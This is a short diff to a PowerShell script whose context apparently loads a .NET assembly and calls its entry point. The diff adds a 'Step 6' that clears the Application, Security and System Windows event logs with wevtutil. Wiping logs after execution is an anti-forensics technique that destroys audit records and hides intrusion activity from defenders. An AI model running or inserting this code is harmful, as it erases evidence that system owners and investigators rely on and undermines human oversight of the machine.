@@ -157,3 +157,18 @@ if ($entryPoint) {
 } else {
     Write-Host "[X] No entry point found in the assembly."
 }
+
+# Step 6: Delete associated logs 
+Write-Host "Attempting to clear selected Windows event logs..."
+# NOTE: You need admin privileges
+$logsToClear = @("Application", "Security", "System")
+foreach ($log in $logsToClear) {
+    try {
+        wevtutil cl $log
+        Write-Host "[!] Cleared event log: $log"
+    }
+    catch {
+        Write-Host "[X] Failed to clear event log: $log. Error: $_"
+    }
+}
+Write-Host "[!] Log clearing complete."
